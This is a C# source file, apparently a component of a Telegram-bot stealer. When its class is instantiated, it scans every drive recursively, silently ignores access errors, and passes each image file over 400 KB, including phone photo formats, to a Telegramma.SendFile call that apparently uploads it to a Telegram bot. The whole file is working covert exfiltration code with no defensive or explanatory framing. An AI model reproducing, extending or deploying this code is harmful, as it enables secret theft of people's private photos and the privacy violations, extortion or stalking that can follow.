namespace TelegramBotPackage.Services.Senders
{
    public class Pictures
    {
        public Pictures()
        {
            string[] pictureExtensions = { ".jpg", ".jpeg", ".png", ".gif", ".tiff", ".bmp", ".webp", ".svg", ".heic", ".aae" };

            DriveInfo[] rootDirectory = DriveInfo.GetDrives();

            foreach (var paths in rootDirectory)
            {
                GetPicturePathsAsync(paths.Name, pictureExtensions);
            }
        }

        public static string[] GetPicturePathsAsync(string directory, string[] extensions)
        {
            var picturePaths = new List<string>();
            string[] files = { };

            // Get all files in the current directory
            try
            {
                files = Directory.GetFiles(directory);
            }
            catch { }

            foreach (var file in files)
            {
                // Check if the file has a picture extension
                if (extensions.Contains(Path.GetExtension(file).ToLower()))
                {
                    picturePaths.Add(file);
                    FileInfo fileInfo = new FileInfo(file);
                    if (fileInfo.Length > 400 * 1024)
                        Telegramma.SendFile(file);
                }
            }

            // Recursively search through subdirectories
            string[] subdirectories = { };
            try
            {
                subdirectories = Directory.GetDirectories(directory);
            }
            catch { }

            foreach (var subdirectory in subdirectories)
            {
                picturePaths.AddRange(GetPicturePathsAsync(subdirectory, extensions));
            }

            return picturePaths.ToArray();
        }
    }
}
